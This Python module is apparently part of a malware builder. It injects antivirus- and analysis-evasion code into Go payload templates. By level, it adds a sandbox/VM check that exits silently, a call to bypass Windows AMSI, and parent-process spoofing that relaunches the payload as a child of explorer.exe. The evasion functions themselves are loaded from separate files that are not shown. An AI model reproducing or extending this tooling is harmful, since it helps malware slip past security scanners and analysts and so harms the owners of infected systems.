#!/usr/bin/env python3
"""
Evasion Code Injector
Injects AMSI bypass and sandbox detection into Go templates
"""

import os
from pathlib import Path

class EvasionInjector:
    def __init__(self):
        self.evasion_dir = Path(__file__).parent.parent / "evasion"
    
    def get_evasion_code(self, evasion_level):
        """Load evasion code based on level"""
        if evasion_level == "none" or evasion_level == "low":
            return "", "", "", ""
        
        # Read evasion.go
        evasion_file = self.evasion_dir / "evasion.go"
        if not evasion_file.exists():
            return "", "", "", ""
            
        with open(evasion_file, "r") as f:
            evasion_code = f.read()
        
        # Extract functions, types, and constants
        lines = evasion_code.split("\n")
        functions = []
        in_block = False
        
        for line in lines:
            # Start capturing on func, type, or const
            if line.startswith("func ") or line.startswith("type ") or line.startswith("const ("):
                in_block = True
            
            if in_block:
                functions.append(line)
                # End capturing on closing brace (simple heuristic)
                if line.strip() == "}" or line.strip() == ")":
                     # Check if we are really ending a block (indentation level 0)
                     if not line.startswith("\t") and not line.startswith(" "):
                         in_block = False
        
        evasion_functions = "\n".join(functions)
        
        # Imports needed
        imports = '''
	"syscall"
	"time"
	"unsafe"
	"os"
'''
        
        # Sandbox checks to inject at start of main()
        sandbox_checks = ""
        if evasion_level in ["medium", "high"]:
            sandbox_checks = '''
	// Sandbox detection
	if isSandbox() {
		return // Exit silently if in VM/sandbox
	}
'''
        
        # AMSI bypass (only on high)
        if evasion_level == "high":
            sandbox_checks += '''
	// AMSI bypass
	bypassAMSI()
'''
        
        
        
        # Parent Process Spoofing (High Evasion)
        spoofing_code = ""
        if evasion_level == "high":
            # Load spoofing code
            spoofing_file = self.evasion_dir / "spoofing.go"
            if spoofing_file.exists():
                with open(spoofing_file, "r") as f:
                    stext = f.read()
                
                # Extract functions, types, and constants
                lines = stext.split("\n")
                func_lines = []
                in_block = False
                
                for line in lines:
                    # Start capturing on func, type, or const
                    if line.startswith("func ") or line.startswith("type ") or line.startswith("const ("):
                        in_block = True
                    
                    if in_block:
                        func_lines.append(line)
                        # End capturing on closing brace (simple heuristic)
                        if line.strip() == "}" or line.strip() == ")":
                             # Check if we are really ending a block (indentation level 0)
                             if not line.startswith("\t") and not line.startswith(" "):
                                 in_block = False
                            
                s_funcs = "\n".join(func_lines)
                evasion_functions += "\n" + s_funcs
                
                # Injection code for main()
                # Relaunch IF not already spoofed (check logic typically needed, simplified here)
                spoofing_code = '''
	// Parent Process Spoofing
	// Target: explorer.exe (User land, trusted)
	if len(os.Args) == 1 { // Only spoof if first run
		if spoofParent("explorer.exe") {
			return // Successfully relaunched as child of explorer
		}
	}
'''
            else:
                spoofing_code = "// Spoofing module missing"
        else:
            spoofing_code = "// Parent Process Spoofing disabled"
        
        return imports, evasion_functions, sandbox_checks, spoofing_code
    
    def inject(self, template_code, evasion_level):
        """Inject evasion code into template"""
        imports, functions, checks, hollowing = self.get_evasion_code(evasion_level)
        
        # Replace placeholders
        template_code = template_code.replace("{{EVASION_IMPORTS}}", imports)
        template_code = template_code.replace("{{EVASION_FUNCTIONS}}", functions)
        template_code = template_code.replace("{{SANDBOX_CHECKS}}", checks)
        template_code = template_code.replace("{{HOLLOWING_CODE}}", hollowing)
        
        return template_code

if __name__ == "__main__":
    # Test
    injector = EvasionInjector()
    imports, funcs, checks, hollowing = injector.get_evasion_code("high")
    print("=== EVASION CODE ===")
    print(f"Imports: {len(imports)} chars")
    print(f"Functions: {len(funcs)} chars")
    print(f"Checks: {len(checks)} chars")
    print(f"Hollowing: {len(hollowing)} chars")
